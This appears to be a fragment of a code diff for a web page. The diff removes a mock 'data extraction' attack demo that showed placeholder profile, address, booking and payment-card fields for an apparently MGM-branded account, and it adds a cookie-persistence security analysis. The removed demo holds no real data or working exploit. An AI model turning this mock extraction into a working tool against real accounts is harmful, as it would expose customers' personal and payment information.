-            switch(dataType) {
-                case 'profile':
-                    return {
-                        // Fields marked with asterisks would contain real data in an actual exploit
-                        "id": "MGM********",
-                        "name": "[User's full name would appear here]*",
-                        "email": "[User's email would appear here]*",
-                        "phone": "[User's phone number would appear here]*",
-                        "membership": {
-                            "level": "[Membership level]*",
-                            "joinDate": "[Join date]*",
-                            "pointsBalance": "[Points balance]*"
-                        },
-                        "preferences": {
-                            "language": "[Preferred language]*",
-                            "currency": "[Preferred currency]*"
-                        }
-                    };
+            // Create explanation text
+            let explanation = `
+                <h4 class="font-medium mb-2">Cookie Persistence Analysis:</h4>
+                <ul class="list-disc pl-8 mb-4">
+                    <li><strong>${persistentCookies} persistent cookies detected</strong> - These cookies remain after the browser is closed</li>
+                    <li><strong>${longLivedCookies} long-lived tracking cookies detected</strong> - These cookies can track users for extended periods</li>
+                    <li><strong>${sessionCookies} session cookies detected</strong> - These cookies are cleared when the browser is closed</li>
+                </ul>
                 
-                case 'account':
-                    return {
-                        "name": "[User's full name would appear here]*",
-                        "address": {
-                            "street": "[Street address]*",
-                            "city": "[City]*",
-                            "state": "[State/Province]*",
-                            "country": "[Country]*",
-                            "zipCode": "[Postal/ZIP code]*"
-                        },
-                        "communication": {
-                            "emailSubscribed": true,
-                            "smsSubscribed": true
-                        },
-                        "lastLogin": "[Timestamp of last login]*",
-                        "securityQuestions": [
-                            "[Security question 1]*",
-                            "[Security question 2]*"
-                        ]
-                    };
-                
-                case 'bookings':
-                    return [
-                        {
-                            "confirmationNumber": "MGM********",
-                            "property": "[Hotel name]*",
-                            "checkIn": "[Check-in date]*",
-                            "checkOut": "[Check-out date]*",
-                            "guests": "[Number of guests]*",
-                            "roomType": "[Room type]*",
-                            "status": "Confirmed",
-                            "totalAmount": "[Amount with currency]*"
-                        },
-                        {
-                            "confirmationNumber": "MGM********",
-                            "property": "[Hotel name]*",
-                            "checkIn": "[Check-in date]*",
-                            "checkOut": "[Check-out date]*",
-                            "guests": "[Number of guests]*",
-                            "roomType": "[Room type]*",
-                            "status": "Completed",
-                            "totalAmount": "[Amount with currency]*"
-                        }
-                    ];
-                
-                case 'payments':
-                    return [
-                        {
-                            "type": "[Card type]*",
-                            "lastFour": "[Last 4 digits]*",
-                            "expiryDate": "[Expiry date]*",
-                            "cardholderName": "[Cardholder name]*",
-                            "billingAddress": {
-                                "street": "[Billing street]*",
-                                "city": "[City]*",
-                                "country": "[Country]*"
-                            }
-                        }
-                    ];
-                
-                default:
-                    return { "note": "No data available for this type" };
-            }
-        }
-        
-        function showExtractedData(data) {
-            addProgressLog('> Data extraction complete!', 'success');
-            addProgressLog('> Displaying retrieved information...');
+                <p class="mb-2"><strong>Security Impact:</strong></p>
+                <p>The presence of persistent cookies without proper security attributes creates privacy and security risks:</p>
+                <ul class="list-disc pl-8">
+                    <li>Users can be tracked across browsing sessions</li>
+                    <li>Cookies stored on shared computers could lead to unauthorized access</li>
+                    <li>Long-lived authentication-related cookies increase the risk of session hijacking</li>
+                </ul>
+            `;
             
-            // Show the data section
-            document.getElementById('dataSection').classList.remove('hidden');
-            
-            // Format and display the data
-            const extractedDataElement = document.getElementById('extractedData');
-            extractedDataElement.textContent = JSON.stringify(data, null, 2);
-            
-            // In a real exploit, we'd highlight actual PII
-            // For the demo, we'll add a note
-            addProgressLog('> NOTE: In a real attack, this data would contain actual personally identifiable information.', 'warning');
-            addProgressLog('> The attack demonstration is complete.', 'success');
+            // Display the results
+            document.getElementById('persistenceExplanation').innerHTML = explanation;
+            document.getElementById('persistenceResults').classList.remove('hidden');
         }
     </script>
 </body>
